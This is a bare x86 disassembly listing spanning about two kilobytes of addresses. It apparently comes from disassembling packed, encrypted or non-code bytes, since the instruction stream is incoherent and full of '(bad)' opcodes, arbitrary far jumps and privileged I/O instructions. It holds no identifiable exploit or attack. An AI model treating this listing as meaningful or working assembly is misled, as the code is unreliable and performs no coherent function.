  4037c8:	mov    bl,0x86
  4037ca:	and    al,0x47
  4037cc:	dec    ebp
  4037cd:	ss adc ah,BYTE PTR ss:[eax+eax*2+0x13]
  4037d3:	xor    ch,bh
  4037d5:	dec    esp
  4037d6:	test   eax,edx
  4037d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037d9:	sub    BYTE PTR [edi-0x2ffbe505],al
  4037df:	ja     0x403846
  4037e1:	aaa    
  4037e2:	xchg   edx,eax
  4037e3:	push   ecx
  4037e4:	jne    0x4037d9
  4037e6:	inc    ecx
  4037e7:	pop    ds
  4037e8:	es dec ecx
  4037ea:	jecxz  0x40385d
  4037ec:	retf   
  4037ed:	ss adc ecx,ecx
  4037f0:	out    0x6b,eax
  4037f2:	stos   BYTE PTR es:[edi],al
  4037f3:	lds    esp,FWORD PTR [ebx+ebx*8-0x40]
  4037f7:	adc    bh,BYTE PTR [eax-0x60]
  4037fa:	inc    eax
  4037fb:	(bad)  
  4037ff:	pop    ebx
  403800:	jmp    0x89f3:0x261fa586
  403807:	pop    edx
  403808:	fcomi  st,st(4)
  40380a:	lds    edx,FWORD PTR [eax]
  40380c:	aad    0xe7
  40380e:	adc    BYTE PTR [edi],dh
  403810:	xchg   BYTE PTR [esi+ebp*2+0x1f],al
  403814:	loopne 0x4037dd
  403816:	sbb    eax,0xbfa7579d
  40381b:	pop    esp
  40381c:	dec    ebx
  40381d:	cmp    DWORD PTR [ebp-0x30036033],0x6ca1b40c
  403827:	popa   
  403828:	retf   
  403829:	(bad)  
  40382a:	jae    0x40385f
  40382c:	ja     0x4037e8
  40382e:	or     esi,eax
  403830:	icebp  
  403831:	add    bl,bh
  403833:	dec    edi
  403834:	mov    dl,0xe9
  403836:	push   esi
  403837:	pop    es
  403838:	iret   
  403839:	les    ebx,FWORD PTR [ebx+0x1f71a6bf]
  40383f:	ficom  WORD PTR [esi]
  403841:	add    bh,BYTE PTR [ebp-0x3359c52c]
  403847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403848:	adc    ecx,ebp
  40384a:	mov    BYTE PTR [edx+0x3f],0x9b
  40384e:	nop
  40384f:	and    dl,dl
  403851:	xchg   edi,eax
  403852:	jge    0x4038a1
  403854:	xor    DWORD PTR [edi-0x5d],0x73246e2a
  40385b:	sbb    eax,0x40b33871
  403860:	jae    0x4038ad
  403862:	adc    al,0x91
  403864:	and    eax,DWORD PTR [eax-0x10]
  403867:	push   esi
  403868:	sbb    ah,BYTE PTR ds:0xc0e3a7f2
  40386e:	stos   DWORD PTR es:[edi],eax
  40386f:	mov    bh,BYTE PTR [esi+0x20]
  403872:	jg     0x403840
  403874:	mov    fs,ebx
  403876:	daa    
  403877:	(bad)  
  403878:	cmp    ebx,DWORD PTR [esi]
  40387a:	cmp    al,0x15
  40387c:	int    0x9b
  40387e:	es js  0x403882
  403881:	(bad)  
  403882:	sbb    DWORD PTR fs:[edx+eiz*1+0x29],ecx
  403887:	ins    BYTE PTR es:[edi],dx
  403888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403889:	mov    bh,0x47
  40388b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40388c:	call   0x4b03:0x58604708
  403893:	iret   
  403894:	xor    BYTE PTR [eax],bh
  403896:	inc    edi
  403897:	xor    ah,bl
  403899:	dec    ebp
  40389a:	out    0x48,al
  40389c:	or     ah,BYTE PTR [ecx-0x56]
  40389f:	jnp    0x4038e5
  4038a1:	sub    DWORD PTR [eax-0x3e8d8b25],ebp
  4038a7:	mov    ebp,0x8b37f6aa
  4038ac:	addr16 aas 
  4038ae:	xchg   BYTE PTR [esi-0x65],bl
  4038b1:	call   0x3a1c:0xec951abc
  4038b8:	aaa    
  4038b9:	inc    edx
  4038ba:	jl     0x40384a
  4038bc:	stos   BYTE PTR es:[edi],al
  4038bd:	(bad)  
  4038be:	aas    
  4038bf:	pop    esi
  4038c0:	ja     0x4038c5
  4038c2:	shr    ecx,1
  4038c4:	sub    DWORD PTR [edx+0x54f44489],eax
  4038ca:	inc    ebx
  4038cb:	and    ecx,DWORD PTR [esi+0x56]
  4038ce:	inc    esp
  4038cf:	mov    cl,0xe4
  4038d1:	mov    cl,0xd3
  4038d3:	stc    
  4038d4:	popa   
  4038d5:	and    cl,BYTE PTR [eax-0x7780abf0]
  4038db:	fcomip st,st(6)
  4038dd:	mov    al,ds:0x210d658
  4038e2:	(bad)  
  4038e3:	jmp    0x403891
  4038e5:	out    0x6d,eax
  4038e7:	in     eax,0xd6
  4038e9:	lahf   
  4038ea:	mov    ds:0x1df98f0f,al
  4038ef:	inc    DWORD PTR [edi+edi*8]
  4038f2:	and    eax,0xca7a83eb
  4038f7:	mov    esi,0x189e85a7
  4038fc:	mov    al,0x1
  4038fe:	xchg   DWORD PTR [ebx],ebp
  403900:	xchg   DWORD PTR [edx+eiz*1+0xc60c10b],edx
  403907:	adc    eax,0xd274ec15
  40390c:	stc    
  40390d:	dec    edx
  40390e:	push   ds
  40390f:	gs jg  0x403972
  403912:	adc    edi,DWORD PTR [edx-0x76515141]
  403918:	lods   al,BYTE PTR ds:[esi]
  403919:	shr    BYTE PTR ds:[eax+ecx*2],cl
  40391d:	cmp    ebp,DWORD PTR [ebx]
  40391f:	push   edi
  403920:	mov    dh,0x41
  403922:	repz (bad) 
  403924:	aaa    
  403925:	or     eax,0x993a025e
  40392a:	jmp    0xf24dc49e
  40392f:	(bad)  
  403930:	leave  
  403931:	inc    ebx
  403932:	push   ss
  403933:	push   eax
  403934:	retf   
  403935:	(bad)  [eax+0x59]
  403938:	sub    DWORD PTR ds:0x7c90d1b5,esi
  40393e:	fnstsw ax
  403940:	(bad)  [ebx+0x43]
  403943:	lods   eax,DWORD PTR ds:[esi]
  403944:	jb     0x4038e2
  403946:	mov    ds:0xb6d78967,al
  40394b:	mov    ebp,0xd9f16570
  403950:	jo     0x403992
  403952:	(bad)  
  403953:	mov    ecx,0xd0b62e1
  403958:	jge    0x403929
  40395a:	leave  
  40395b:	and    al,0x1
  40395d:	jmp    0xaf25:0x73eee3a
  403964:	cmp    DWORD PTR [ebp-0x54f02410],0x8cd737ef
  40396e:	jbe    0x40390d
  403970:	pop    ss
  403971:	jl     0x4039b8
  403973:	pop    edx
  403974:	fisub  WORD PTR [eax-0x4834e782]
  40397a:	test   al,0x4e
  40397c:	inc    edx
  40397d:	adc    bl,BYTE PTR [ebx]
  40397f:	sbb    DWORD PTR [ecx-0x27fbb45a],0x62
  403986:	mov    DWORD PTR [ebp-0x5524c089],esi
  40398c:	aam    0x75
  40398e:	daa    
  40398f:	rol    DWORD PTR cs:0xdfd4d62f,0xad
  403997:	jmp    FWORD PTR [ecx-0x12400cc1]
  40399d:	pop    es
  40399e:	xor    BYTE PTR [ecx],0xe2
  4039a1:	(bad)  
  4039a2:	in     eax,dx
  4039a3:	cwde   
  4039a4:	fmul   QWORD PTR [edx-0x54]
  4039a7:	mov    ebp,0x1c95315c
  4039ac:	ins    BYTE PTR es:[edi],dx
  4039ad:	aad    0x81
  4039af:	outs   dx,BYTE PTR ds:[esi]
  4039b0:	or     dl,BYTE PTR [edi+esi*2+0x5a]
  4039b4:	xchg   edi,eax
  4039b5:	ds pusha 
  4039b7:	mov    WORD PTR fs:[ecx],es
  4039ba:	add    eax,0x2b8837b9
  4039bf:	cmp    dh,BYTE PTR [edx+0x2c]
  4039c2:	pusha  
  4039c3:	fldcw  WORD PTR [ebx-0x4652296f]
  4039c9:	in     eax,dx
  4039ca:	push   cs
  4039cb:	test   DWORD PTR [eax-0x65],eax
  4039ce:	adc    dh,bh
  4039d0:	jp     0x403952
  4039d2:	sub    BYTE PTR [ebx-0x257007ae],ah
  4039d8:	and    ch,BYTE PTR [edx-0x7b]
  4039db:	jg     0x403a5b
  4039dd:	inc    esp
  4039de:	fwait
  4039df:	cld    
  4039e0:	adc    BYTE PTR [ebx+0xf6c8a2b],dh
  4039e6:	mov    BYTE PTR [esi+edx*8+0x31915e02],dh
  4039ed:	adc    BYTE PTR [edi],ch
  4039ef:	cmp    al,0xfa
  4039f1:	jle    0x4039c0
  4039f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039f4:	(bad)  
  4039f5:	cmp    DWORD PTR [esp+eiz*8],ebx
  4039f8:	pushf  
  4039f9:	mov    eax,DWORD PTR [ecx+0x68e5d220]
  4039ff:	test   al,0x78
  403a01:	das    
  403a02:	or     al,0x6b
  403a04:	pop    ecx
  403a05:	loope  0x403a3a
  403a07:	mov    esp,0x91e9f069
  403a0c:	jmp    0xf304b21b
  403a11:	test   bh,bh
  403a13:	push   0x614fd63e
  403a18:	adc    DWORD PTR [ebp+0x45],edx
  403a1b:	mov    edx,0xf9df32c4
  403a20:	pop    ds
  403a21:	and    eax,edx
  403a23:	in     eax,dx
  403a24:	mov    edi,0x9ba3d534
  403a29:	adc    eax,0x9245396e
  403a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a2f:	fadd   st,st(5)
  403a31:	mov    cl,0xc
  403a33:	loope  0x403aab
  403a35:	stc    
  403a36:	mov    ds:0xe330d61e,eax
  403a3b:	lock popf 
  403a3d:	mov    eax,ds:0x74876d09
  403a42:	sbb    esp,DWORD PTR [edi+ecx*1]
  403a45:	dec    esi
  403a46:	sbb    cl,dh
  403a48:	mov    ds:0xba878ee2,eax
  403a4d:	dec    ebp
  403a4e:	jo     0x403a35
  403a50:	inc    ebx
  403a51:	push   cs
  403a52:	xchg   DWORD PTR [edi+0x38a638a],ebp
  403a58:	xchg   BYTE PTR ds:0xa0f589f8,dl
  403a5e:	sub    al,0xd9
  403a60:	xchg   DWORD PTR [eax+0x11269bea],edx
  403a66:	mov    WORD PTR [edi],fs
  403a68:	xchg   edx,eax
  403a69:	lock adc edi,DWORD PTR [esi-0x7a0dcf6b]
  403a70:	mov    al,0x3d
  403a72:	outs   dx,DWORD PTR ds:[esi]
  403a73:	inc    edi
  403a74:	push   edx
  403a75:	and    DWORD PTR [edi+0x2f],eax
  403a78:	cmp    edx,DWORD PTR [ebx+0x7861717e]
  403a7e:	rol    BYTE PTR [ebx],cl
  403a80:	in     eax,dx
  403a81:	je     0x403a4e
  403a83:	(bad)  [ebx]
  403a85:	imul   esi,ebp,0xffffffb2
  403a88:	xor    edi,DWORD PTR [eax+eiz*2-0x45]
  403a8c:	test   BYTE PTR [edi-0x12c645fb],ch
  403a92:	xlat   BYTE PTR ds:[ebx]
  403a93:	jmp    0x724:0xe185664b
  403a9a:	out    0xb0,eax
  403a9c:	daa    
  403a9d:	and    eax,DWORD PTR [ecx]
  403a9f:	(bad)  
  403aa0:	loop   0x403a25
  403aa2:	inc    ebx
  403aa3:	repz call 0x5a30:0x93412b74
  403aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403aac:	shl    esi,0xae
  403aaf:	sub    eax,0xb3412f38
  403ab4:	call   0xbcc8:0xbde417a2
  403abb:	sub    dh,BYTE PTR [ebp-0x9]
  403abe:	bnd jne 0x403a70
  403ac1:	cdq    
  403ac2:	jmp    0x65a7:0x1bc4c366
  403ac9:	test   eax,0x237421d5
  403ace:	mov    esp,0x9039bb9f
  403ad3:	ss sar ecx,0x5b
  403ad7:	ss jbe 0x403ae2
  403ada:	mov    ebp,0x90fb08ae
  403adf:	mov    edx,0xf510cd0d
  403ae4:	rol    BYTE PTR [edx-0x2d686548],0x61
  403aeb:	inc    esi
  403aec:	(bad)  
  403aed:	pushf  
  403aee:	out    0xce,eax
  403af0:	test   al,0xcd
  403af2:	add    al,0x40
  403af4:	mov    al,0xf2
  403af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403af7:	std    
  403af8:	mov    ch,BYTE PTR [edi-0x4d]
  403afb:	mov    ch,0x17
  403afd:	sbb    BYTE PTR [ebx-0x33],bl
  403b00:	dec    ecx
  403b01:	xor    al,dh
  403b03:	dec    ebp
  403b04:	adc    bh,BYTE PTR [ebp+0x33]
  403b07:	and    al,0x11
  403b09:	mov    WORD PTR [ebp+0x5fc6b4e1],cs
  403b0f:	adc    esi,edi
  403b11:	ins    DWORD PTR es:[edi],dx
  403b12:	mov    edx,0x3f4358a1
  403b17:	mov    al,0x6f
  403b19:	dec    edi
  403b1a:	jbe    0x403b87
  403b1c:	int    0x82
  403b1e:	aaa    
  403b1f:	cmp    eax,DWORD PTR [edx-0x4]
  403b22:	xchg   BYTE PTR [edx+0x69],ah
  403b25:	xchg   ecx,eax
  403b26:	ret    
  403b27:	in     al,dx
  403b28:	rcr    DWORD PTR [ebp+0x20],1
  403b2b:	fnop   
  403b2d:	inc    esp
  403b2e:	or     bl,cl
  403b30:	jmp    0x403ba5
  403b32:	add    ebx,DWORD PTR ds:[ebx-0x18b814b3]
  403b39:	mov    BYTE PTR [esi+ecx*2-0x5d],dl
  403b3d:	arpl   WORD PTR [esi-0x26],dx
  403b40:	xchg   esp,eax
  403b41:	shr    BYTE PTR [edx+esi*1-0x1e4d8e83],0xcf
  403b49:	or     eax,0x45bbf0f4
  403b4e:	dec    esi
  403b4f:	out    dx,eax
  403b50:	xlat   BYTE PTR ds:[ebx]
  403b52:	or     al,0x3b
  403b54:	imul   eax,DWORD PTR [edx-0x1cdd223f],0x2924186c
  403b5e:	and    al,dh
  403b60:	stos   DWORD PTR es:[edi],eax
  403b61:	popa   
  403b62:	inc    ecx
  403b63:	pop    esp
  403b64:	inc    edx
  403b65:	push   esi
  403b66:	call   0xc009bb5a
  403b6b:	imul   eax,ebx,0xffffff97
  403b6e:	es data16 jl 0x403b96
  403b72:	hlt    
  403b73:	outs   dx,DWORD PTR ds:[esi]
  403b74:	mov    ch,0xca
  403b76:	jno    0x403bc6
  403b78:	cdq    
  403b79:	xor    dl,ah
  403b7b:	sbb    ebx,ebp
  403b7d:	cmp    cl,BYTE PTR [eax*4-0x511e574b]
  403b84:	push   ecx
  403b85:	push   cs
  403b86:	or     esi,DWORD PTR [eax-0x5229fcb4]
  403b8c:	sar    ecx,0x75
  403b8f:	xchg   ecx,eax
  403b90:	jge    0x403b35
  403b92:	dec    edx
  403b93:	push   ds
  403b94:	adc    cl,ch
  403b96:	retf   0x4dc1
  403b99:	outs   dx,DWORD PTR es:[esi]
  403b9b:	sbb    ah,BYTE PTR [edi+0xbf9e1e9]
  403ba1:	popa   
  403ba2:	popa   
  403ba3:	hlt    
  403ba4:	xchg   DWORD PTR [ebx],edx
  403ba6:	or     eax,0x440d0eee
  403bab:	or     eax,ebx
  403bad:	add    al,0x33
  403baf:	or     dh,BYTE PTR [edi+0x4b716374]
  403bb5:	add    al,0x61
  403bb7:	pop    ds
  403bb8:	and    al,0x6c
  403bba:	pusha  
  403bbb:	jno    0x403b86
  403bbd:	and    eax,0xe32eb620
  403bc2:	pop    es
  403bc3:	adc    eax,0x87524c88
  403bc8:	mov    eax,ds:0x5218589e
  403bcd:	fistp  WORD PTR [ebx-0x7fe8c9ae]
  403bd3:	cs popf 
  403bd5:	dec    ecx
  403bd6:	mov    al,ds:0x13a1770f
  403bdb:	(bad)  
  403bdc:	mov    eax,ds:0x49903456
  403be1:	xor    DWORD PTR [ebp-0x7e],ecx
  403be4:	add    al,0xe4
  403be6:	and    eax,DWORD PTR [edi+0x6b]
  403be9:	sub    ebx,ebp
  403beb:	test   DWORD PTR [eax-0x428bb52b],eax
  403bf1:	cmp    DWORD PTR [ecx],esp
  403bf3:	retf   0xf6cf
  403bf6:	daa    
  403bf7:	stos   BYTE PTR es:[edi],al
  403bf8:	inc    eax
  403bf9:	xchg   ebx,eax
  403bfa:	es add al,0x21
  403bfd:	pop    es
  403bfe:	adc    DWORD PTR [edx-0x9],esi
  403c01:	aam    0x96
  403c03:	mov    edi,0x44f10084
  403c08:	dec    edi
  403c09:	mov    bh,0x8d
  403c0b:	xor    BYTE PTR [edi+0x16],al
  403c0e:	into   
  403c0f:	shl    BYTE PTR [edx],cl
  403c11:	cmp    al,0x14
  403c13:	test   DWORD PTR [ebp+0x9905511],0x82c30285
  403c1d:	push   ebp
  403c1e:	add    dl,BYTE PTR [esi+0x71fbce44]
  403c24:	daa    
  403c25:	xchg   DWORD PTR [edx],edi
  403c27:	sub    ah,dl
  403c29:	test   BYTE PTR [ebp-0x22],0xf2
  403c2d:	mov    edi,0x902cf9e6
  403c32:	pop    ecx
  403c33:	xchg   edi,eax
  403c34:	push   esp
  403c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c36:	ja     0x403bee
  403c38:	jnp    0x403c5a
  403c3a:	mov    bh,0xb1
  403c3c:	sub    eax,0x61fbc8d3
  403c41:	jl     0x403bcd
  403c43:	call   0x6ebd:0x7be399e0
  403c4a:	pop    esp
  403c4b:	arpl   WORD PTR [edx+0x108a22e6],di
  403c51:	shr    BYTE PTR [edx+esi*2+0x1b1c0ceb],1
  403c58:	mov    esi,0x6e4c87d3
  403c5d:	adc    ebx,DWORD PTR [esi-0x6]
  403c60:	bndstx [ebx],(bad)
  403c63:	dec    ecx
  403c64:	aad    0x55
  403c66:	mov    edi,0xe6b9563c
  403c6b:	cwde   
  403c6c:	xchg   esi,eax
  403c6d:	js     0x403c9a
  403c6f:	jb     0x403c78
  403c71:	and    eax,0xdd626cdc
  403c76:	xchg   DWORD PTR [ebx-0x7e],edi
  403c79:	sar    BYTE PTR [ebp-0x6b9baa3a],1
  403c7f:	dec    edx
  403c80:	cs xor eax,0xdc4b1001
  403c86:	dec    ecx
  403c87:	pop    ebx
  403c88:	sbb    eax,0xcd94daad
  403c8d:	rcr    DWORD PTR [edi+0x2ee9be32],1
  403c93:	(bad)  
  403c94:	jecxz  0x403cbe
  403c96:	ins    DWORD PTR es:[edi],dx
  403c97:	xor    bh,BYTE PTR fs:[ecx-0x71]
  403c9b:	loope  0x403cb1
  403c9d:	push   edi
  403c9e:	push   cs
  403c9f:	into   
  403ca0:	or     al,0x9c
  403ca2:	xchg   edi,eax
  403ca3:	adc    ebp,DWORD PTR [edx+0x2579a61e]
  403ca9:	xlat   BYTE PTR ds:[ebx]
  403caa:	push   ebp
  403cab:	add    ch,BYTE PTR [esi+0x31d3f661]
  403cb1:	sub    BYTE PTR [esi+0xb750205],bl
  403cb7:	sub    ecx,eax
  403cb9:	xchg   esi,eax
  403cba:	or     al,0x63
  403cbc:	jmp    0x4244:0xd29d6252
  403cc3:	pop    edi
  403cc4:	dec    eax
  403cc5:	add    dl,BYTE PTR [eax+0x38]
  403cc8:	mov    eax,ds:0xb3a59a91
  403ccd:	mov    dl,0xd1
  403ccf:	jecxz  0x403d08
  403cd1:	loopne 0x403cbe
  403cd3:	out    dx,al
  403cd4:	jp     0x403cfb
  403cd6:	out    dx,eax
  403cd7:	fmul   QWORD PTR [edi+0x3b]
  403cda:	xor    eax,0x75edc040
  403cdf:	in     eax,dx
  403ce0:	fsub   QWORD PTR [ebp-0x1]
  403ce3:	fistp  WORD PTR [ebx]
  403ce5:	arpl   WORD PTR [edx+0x2b],bx
  403ce8:	scas   al,BYTE PTR es:[edi]
  403ce9:	sar    esi,cl
  403ceb:	mov    eax,0x6c2e63f6
  403cf0:	adc    eax,ecx
  403cf2:	rcl    DWORD PTR [esi-0x69],0x5b
  403cf6:	push   esi
  403cf7:	xor    eax,0xaf81cbae
  403cfc:	cmp    BYTE PTR [ecx+0x7a],0x8b
  403d00:	adc    eax,0x64de4ec0
  403d05:	mov    DWORD PTR [esi+esi*4-0x58],ebp
  403d09:	adc    cl,BYTE PTR [eax-0x67f5ffa6]
  403d0f:	push   ecx
  403d10:	push   eax
  403d11:	js     0x403ced
  403d13:	adc    ebx,0x4de742e7
  403d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d1a:	mov    ch,0x10
  403d1c:	pop    edx
  403d1d:	es cdq 
  403d1f:	sub    edi,DWORD PTR [edi-0x5af5fa97]
  403d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d26:	imul   ah
  403d28:	xchg   ah,cl
  403d2a:	ret    0x4056
  403d2d:	test   BYTE PTR [ebx+ebp*2],ah
  403d30:	adc    ax,0x4f43
  403d34:	cmp    al,0x7
  403d36:	push   edx
  403d37:	dec    esi
  403d38:	and    ah,bh
  403d3a:	fmul   QWORD PTR cs:[ebp+0x77b94cbc]
  403d41:	loopne 0x403d2a
  403d43:	dec    esi
  403d44:	sub    al,0xfa
  403d46:	and    bh,0x7
  403d49:	adc    DWORD PTR ds:0x593cf994,0x8df14a0d
  403d53:	test   al,0x22
  403d55:	mov    ch,0x3a
  403d57:	shr    ebp,cl
  403d59:	jmp    0xe3edb55e
  403d5e:	and    BYTE PTR [esp+ecx*2+0x19794ff],bh
  403d65:	aad    0xbc
  403d67:	data16 sahf 
  403d69:	push   esi
  403d6a:	sahf   
  403d6b:	jbe    0x403d34
  403d6d:	cmp    bh,0x16
  403d70:	and    al,0xc8
  403d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d73:	add    eax,0x472e850e
  403d78:	clc    
  403d79:	out    0xd8,al
  403d7b:	xor    BYTE PTR [ebx],bl
  403d7d:	pop    esp
  403d7e:	xchg   edx,eax
  403d7f:	retf   
  403d80:	mov    dh,0x99
  403d82:	jl     0x403d7d
  403d84:	sbb    eax,0x8551702b
  403d89:	(bad)  
  403d8a:	pop    ecx
  403d8b:	lds    esp,FWORD PTR [edi+0x1e]
  403d8e:	sub    ecx,DWORD PTR [ebp+0x7]
  403d91:	int    0x1b
  403d93:	dec    edx
  403d94:	xchg   esp,eax
  403d95:	stos   DWORD PTR es:[edi],eax
  403d96:	sub    bl,BYTE PTR [esi]
  403d98:	mov    dl,0x76
  403d9a:	test   eax,0x127a22a9
  403d9f:	jns    0x403d9b
  403da1:	enter  0x4d05,0x94
  403da5:	xchg   DWORD PTR [ecx+0x57323f76],edi
  403dab:	and    eax,0x6585e09a
  403db0:	sbb    DWORD PTR [esi],eax
  403db2:	sub    dh,BYTE PTR [edx-0x11e3ab47]
  403db8:	test   al,0x57
  403dba:	inc    ebx
  403dbb:	test   al,0x9e
  403dbd:	ds inc esp
  403dbf:	in     al,dx
  403dc0:	dec    ecx
  403dc1:	int3   
  403dc2:	dec    ebx
  403dc3:	sbb    ecx,DWORD PTR [edx+0x2667413c]
  403dc9:	lods   eax,DWORD PTR ds:[esi]
  403dca:	inc    ebx
  403dcb:	out    dx,al
  403dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dcd:	fwait
  403dce:	scas   al,BYTE PTR es:[edi]
  403dcf:	pop    edi
  403dd0:	outs   dx,BYTE PTR ds:[esi]
  403dd1:	jle    0x403deb
  403dd3:	add    bh,BYTE PTR [ebx-0x76]
  403dd6:	sbb    al,0x8c
  403dd8:	in     al,0x1c
  403dda:	mov    dh,0x6c
  403ddc:	mov    esp,0x6d573f98
  403de1:	shr    BYTE PTR [esi],cl
  403de3:	ds je  0x403dd1
  403de6:	jg     0x403e40
  403de8:	test   DWORD PTR [ecx+0x16ef7aa2],ebx
  403dee:	cld    
  403def:	mov    gs,WORD PTR [ecx+esi*1+0xc75898a]
  403df6:	je     0x403e40
  403df8:	cmp    al,0x19
  403dfa:	fistp  WORD PTR [eax+eax*4]
  403dfd:	sub    al,0x98
  403dff:	aaa    
  403e00:	xchg   bl,al
  403e02:	push   ds
  403e03:	and    al,0xc2
  403e05:	jg     0x403e23
  403e07:	ret    
  403e08:	add    eax,DWORD PTR [edx-0x52]
  403e0b:	xchg   ebp,eax
  403e0c:	mov    bh,0xe2
  403e0e:	pushf  
  403e0f:	retf   
  403e10:	cmp    BYTE PTR [ecx+ecx*4],0xcd
  403e14:	popa   
  403e15:	dec    edx
  403e16:	cmp    ch,dh
  403e18:	inc    ecx
  403e19:	mov    dh,0xaa
  403e1b:	jge    0x403dbb
  403e1d:	and    BYTE PTR [eax-0x79],bl
  403e20:	sahf   
  403e21:	fs fcmove st,st(4)
  403e24:	pop    eax
  403e25:	retf   0x65b6
  403e28:	stos   BYTE PTR es:[edi],al
  403e29:	xor    BYTE PTR [esi],bl
  403e2b:	push   eax
  403e2c:	adc    BYTE PTR [esi+0x3d],dl
  403e2f:	and    dl,cl
  403e31:	les    ecx,FWORD PTR [edx-0x52]
  403e34:	pop    edx
  403e35:	call   0x7ae200d1
  403e3a:	adc    bh,BYTE PTR [edx-0x5b336641]
  403e40:	(bad)  
  403e42:	cmp    al,dl
  403e44:	mov    edi,0x6e9c098e
  403e49:	stos   BYTE PTR es:[edi],al
  403e4a:	pop    ebp
  403e4b:	jmp    0xafbc:0x9a51217c
  403e52:	xchg   edx,eax
  403e53:	test   BYTE PTR [ebp-0x2cb6a9b2],ah
  403e59:	mov    esi,0xa74e94b
  403e5e:	fwait
  403e5f:	sbb    eax,0x1af51000
  403e64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e65:	fs call 0xd9eb3bc2
  403e6b:	and    al,BYTE PTR [eax+0x57]
  403e6e:	retf   
  403e6f:	loopne 0x403e0a
  403e71:	adc    BYTE PTR [edi],al
  403e73:	(bad)  
  403e74:	out    dx,al
  403e75:	neg    ah
  403e77:	and    BYTE PTR [ebp-0x46],al
  403e7a:	fcomp  DWORD PTR [esi+0x7fc86543]
  403e80:	jne    0x403efd
  403e82:	clc    
  403e83:	int3   
  403e84:	push   ecx
  403e85:	neg    DWORD PTR [ebp-0x80a23e4]
  403e8b:	pop    ecx
  403e8c:	cmp    dl,BYTE PTR [edi+eax*8-0x6ad2c82c]
  403e93:	mov    ch,0x72
  403e95:	(bad)  
  403e96:	in     eax,0x4f
  403e98:	fs xor eax,0x734dfd43
  403e9e:	mov    edx,DWORD PTR [ecx+0x585bea81]
  403ea4:	xor    esi,ecx
  403ea6:	mov    eax,0x5b07ae32
  403eab:	dec    ebp
  403eac:	jnp    0x403eb5
  403eae:	lods   eax,DWORD PTR ds:[esi]
  403eaf:	div    DWORD PTR [edi+0x55]
  403eb2:	out    0xcd,eax
  403eb4:	aas    
  403eb5:	dec    ebx
  403eb6:	(bad)  
  403eb7:	mov    ebx,0x6bdd1f64
  403ebc:	adc    BYTE PTR [eax-0x122af767],ah
  403ec2:	xlat   BYTE PTR ds:[ebx]
  403ec3:	push   ss
  403ec4:	pop    ebx
  403ec5:	mov    cx,0x793f
  403ec9:	rcl    esp,1
  403ecb:	mov    eax,ds:0xcd614709
  403ed0:	jnp    0x403f12
  403ed2:	hlt    
  403ed3:	loopne 0x403e66
  403ed5:	outs   dx,BYTE PTR ds:[esi]
  403ed6:	cld    
  403ed7:	sbb    bl,BYTE PTR [ecx+edi*1-0x46da58e3]
  403ede:	xor    al,0x99
  403ee0:	cmp    bl,al
  403ee2:	pop    ebp
  403ee3:	xchg   edi,eax
  403ee4:	out    dx,eax
  403ee5:	pop    ebx
  403ee6:	rol    BYTE PTR [edi+0x78ff3d56],1
  403eec:	je     0x403ef8
  403eee:	pop    ds
  403eef:	inc    edi
  403ef0:	jo     0x403f25
  403ef2:	ss xchg edi,eax
  403ef4:	arpl   ax,dx
  403ef6:	iret   
  403ef7:	aad    0x3a
  403ef9:	in     al,dx
  403efa:	xor    dl,BYTE PTR [ecx]
  403efc:	add    bl,bh
  403efe:	or     eax,0x3472aac1
  403f03:	jnp    0x403e88
  403f05:	test   ch,0x5a
  403f08:	push   ss
  403f09:	xchg   ebx,eax
  403f0a:	ds mov cl,0xaa
  403f0d:	call   0x5dc05026
  403f12:	pop    es
  403f13:	fdivr  QWORD PTR [edi]
  403f15:	ret    0x535b
  403f18:	inc    esi
  403f19:	xchg   edi,eax
  403f1a:	shl    BYTE PTR [ebp+0x54],cl
  403f1d:	mov    ds:0x6e10dc8c,eax
  403f22:	fiadd  DWORD PTR [esi]
  403f24:	inc    ebx
  403f25:	es jp  0x403f39
  403f28:	fistp  WORD PTR es:[eax-0x3740c487]
  403f2f:	sbb    BYTE PTR [edi+0x1dc56d84],al
  403f35:	pushf  
  403f36:	adc    esp,ebx
  403f38:	sub    eax,0xa2e432fc
  403f3d:	das    
  403f3e:	and    BYTE PTR [ecx+edi*1+0x12dc0dff],0x8b
  403f46:	ja     0x403fa2
  403f48:	jge    0x403f14
  403f4a:	adc    BYTE PTR [esi+0x31fbdfa1],ah
  403f50:	and    eax,0x2231d50f
  403f55:	jecxz  0x403f8a
  403f57:	mov    edi,0xe9184b56
  403f5c:	push   ss
  403f5d:	or     BYTE PTR [ebp+0x1c],dh
  403f60:	and    DWORD PTR [edx-0x25],0xcc44e5a5
  403f67:	adc    DWORD PTR [esi+0x4a],esi
  403f6a:	stos   BYTE PTR es:[edi],al
  403f6b:	inc    esp
  403f6c:	retf   0xb100
  403f6f:	dec    ebp
  403f70:	mov    edx,0x82b650e3
  403f75:	shl    DWORD PTR [eax-0x47],cl
  403f78:	inc    ebx
  403f79:	nop
  403f7a:	popf   
  403f7b:	je     0x403fc7
  403f7d:	loop   0x403f9d
  403f7f:	pusha  
  403f80:	xor    al,0xfd
  403f82:	inc    eax
  403f83:	add    eax,0x3b37fb73
  403f88:	cs dec ecx
  403f8a:	cli    
  403f8b:	test   eax,0x17c0885c
  403f90:	(bad)  
  403f91:	jne    0x403fcc
  403f93:	icebp  
  403f94:	daa    
  403f95:	pop    ss
  403f96:	cdq    
  403f97:	test   eax,ebx
  403f99:	je     0x403f6f
  403f9b:	arpl   bx,sp
  403f9d:	pop    eax
  403f9e:	cdq    
  403f9f:	ror    BYTE PTR [esi+ebp*8-0x77],cl
  403fa3:	into   
  403fa4:	push   eax
  403fa5:	sub    eax,0x511ddcde
  403faa:	inc    esp
  403fab:	push   ds
  403fac:	pop    ds
  403fad:	int3   
  403fae:	or     ch,BYTE PTR [edx]
  403fb0:	clc    
